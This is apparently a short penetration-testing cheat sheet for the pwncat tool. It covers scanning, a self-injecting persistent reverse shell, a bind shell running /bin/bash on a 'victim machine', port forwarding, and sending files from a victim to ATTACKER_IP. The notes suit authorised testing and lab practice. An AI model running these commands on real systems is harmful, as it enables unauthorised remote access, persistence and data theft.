# Pwncat

## Installation

#### 1) Pip

    pip install pwncat

#### 2) Apt

    sudo apt install pwncat

## Usage:

#### 1) Sets up a listener while creating a persistent mechanism. Connect back with rlwrap nc -lvnp PORT. +NUM indicates how many more ports does the persistent mechanism work

    pwncat -l PORT --self-inject /bin/bash:TARGET_IP:PORT+NUM 

Test for persistence

    rlwrap nc -lvnp PORT

#### 2) Port Scan

    sudo pwncat -z IP 1-65535

#### 3) Banner grabbing

    sudo pwncat -z IP 1-65535 --banner

#### 4) UDP Scan

    sudo pwncat -z IP 1-100 -u

#### 5) Windows reverse shell

    pwncat -l PORT

On revshells.com, choose pwncat listener with powershell reverse shell

<img width="1210" height="1202" alt="image" src="https://github.com/user-attachments/assets/3a112c58-0752-432b-9e7e-8c26481efff5" />

#### 6) Local port forwarding

Install on victim machine

    pip3 install pwncat

Run this on victim machine that has an internal port to forward

    pwncat -L 0.0.0.0:5000 127.0.0.1 INTERNAL_PORT

Access the web app via 

    http://TARGET_IP:5000

#### 7) File transfer

Receive file on our machine

    pwncat -l PORT > data.txt

On victim machine, send file to our machine

    pwncat ATTACKER_IP PORT < data.txt

#### 8) Bind shell

Attacker machine

    pwncat TARGET_IP PORT

Victim machine

    pwncat -l -e '/bin/bash' PORT -k
